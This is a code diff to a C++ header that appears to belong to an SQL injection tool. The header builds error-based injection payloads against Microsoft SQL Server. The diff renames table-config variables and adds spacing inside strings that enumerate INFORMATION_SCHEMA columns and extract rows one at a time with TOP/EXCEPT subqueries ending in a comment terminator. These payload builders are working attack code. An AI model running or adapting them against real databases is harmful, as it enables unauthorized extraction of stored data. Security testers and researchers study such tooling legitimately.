@@ -1,13 +1,8 @@
 #ifndef MICROSOFTSQL_ERROR_BASED
 #define MICROSOFTSQL_ERROR_BASED
 
-#define ERROR_BASED_INDEX 0
-#define ERROR_BASED_MARKED 1
-#define ERROR_BASED_DATABASE 2
-#define ERROR_BASED_TABLE 3
-#define ERROR_BASED_COLUMN 4
-
 #include "../../Vaccine.hpp"
+#include "../mysql/mysql.hpp"
 
 struct microsoftsql_error_based
 {
@@ -53,7 +48,7 @@ struct microsoftsql_error_based
                                "FROM " + *config[ERROR_BASED_DATABASE] +
                                ".INFORMATION_SCHEMA.COLUMNS " +
                                "WHERE TABLE_NAME='" +
-                               *config[UNION_BASED_TABLE] + "' " +
+                               *config[ERROR_BASED_TABLE] + "' " +
 
                                "ORDER BY (SELECT NULL) " +
                                "EXCEPT SELECT TOP " +
@@ -68,16 +63,16 @@ struct microsoftsql_error_based
                                " AS varchar(255)) " +
                                "FROM (SELECT TOP " +
                                std::to_string(index + 1) + " " +
-                               *config[ERROR_BASED_COLUMN] +
+                               *config[ERROR_BASED_COLUMN] + " " +
                                "FROM " + *config[ERROR_BASED_DATABASE] + ".." +
-                               *config[UNION_BASED_TABLE] + " " +
+                               *config[ERROR_BASED_TABLE] + " " +
 
                                "ORDER BY (SELECT NULL) " +
                                "EXCEPT SELECT TOP " +
                                index_str + " " +
-                               *config[ERROR_BASED_COLUMN] +
+                               *config[ERROR_BASED_COLUMN] + " " +
                                "FROM " + *config[ERROR_BASED_DATABASE] + ".." +
-                               *config[UNION_BASED_TABLE] + " " +
+                               *config[ERROR_BASED_TABLE] + " " +
                                "ORDER BY (SELECT NULL)) AS sub))-- ";
                 default:
                         return std::string();
